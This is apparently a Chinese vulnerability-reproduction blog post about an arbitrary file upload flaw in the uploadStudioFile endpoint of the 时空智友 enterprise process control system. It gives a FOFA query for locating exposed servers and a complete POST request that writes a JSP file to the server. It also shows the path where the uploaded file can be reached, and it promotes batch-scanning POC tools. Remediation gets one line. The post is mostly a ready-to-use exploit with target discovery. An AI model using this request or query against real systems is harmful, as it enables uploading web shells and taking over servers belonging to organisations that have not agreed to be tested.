#  时空智友企业流程化管控系统uploadStudioFile接口存在任意文件上传漏洞 -老漏洞   
 南风漏洞复现文库   2024-10-23 23:13  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 时空智友企业流程化管控系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。  
## 2.漏洞描述  
  
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统存在任意文件上传漏洞，时空智友企业流程化管控系统uploadStudioFile接口存在任意文件上传漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
时空智友  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvebPonGibKYfjbnIRMTkbI547RXeUvrknOib7eSYLdrnibx6ibLEsxrCTzQ/640?wx_fmt=png&from=appmsg "null")  
  
时空智友企业流程化管控系统uploadStudioFile接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
body="login.jsp?login=null"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/formservice?service=updater.uploadStudioFile  
  
漏洞数据包：  
```
POST /formservice?service=updater.uploadStudioFile HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Length: 441
Content-Type: application/x-www-form-urlencoded

content=%3c%3fxml%20version%3d%221.0%22%3f%3e%3croot%3e%3cfilename%3e677433.jsp%3c%2ffilename%3e%3cfilepath%3e.%2f%3c%2ffilepath%3e%3cfilesize%3e172%3c%2ffilesize%3e%3clmtime%3e1970-01-01%2008%3a00%3a00%3c%2flmtime%3e%3c%2froot%3e%3c!--%3c%25%20out.print(%22%3cpre%3e%22)%3bout.println(3233%20*%203323)%3bout.print(%22%3c%2fpre%3e%22)%3bnew%20java.io.File(application.getRealPath(request.getServletPath())).delete()%3b%0d%0a%25%3e%0d%0a--%3e
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvL9INDCmCTiaybG8YzIFwJAoErp1TwkmyumVnkkNicBWOLzR6icvuJL3CQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传后的路径 http://xx.xx.xx.xx/update/temp/studio/677433.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvAkXBHz7HVqGt3t5I7HniaB7pdzCtfnib9CGVLp5Mt9yTrSRVygQQdszg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvNvMOlCWwYguXh3In1BOZ5b9s7cRLGZI80R57HadTwxPRJcztQumFYA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvMJAEEpUic0X8SWK3S2MWX1bB9svoMIFUFAobadrYlrNhtfWJ1RjhTyA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMv5MY4KQibUtLr8ibEoDerD7pbaibtz2fbiaKYH6AQZMl2l9XWjvzQL9alzw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMv3MV3dFDOWKD5gIouS4T4qrcWjv7RBDy550tuJ0rT2Hel4ZA4BO2TNA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvfTAcRSWiaVQjt3b3E3B9DC3Wa6O7XiaOVAEoiah1JmfLBxbb64s9kh2PQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注厂商更新 https://www.sxskzy.com/  
## 8.往期回顾  
  
[明源云ERP报表服务GetErpConfig.aspx接口存在敏感信息泄露漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487624&idx=1&sn=33135f963826604ee69c3fa856c5c052&chksm=974b9d8fa03c14999e4ffe2b8ebb480471d29c278166864c0d58b06595586ef862c67c8d3182&scene=21#wechat_redirect)  
  
  
[officeWeb365 PW/SaveDraw接口存在任意文件上传漏洞 -老漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487612&idx=1&sn=7eab6f76a8eefdfae301fbce1d4b8484&chksm=974b9d7ba03c146da28d4bad3e7de866b717612911e05fa549cef911510b6dba50d9f157f0ad&scene=21#wechat_redirect)  
  
  
  
  
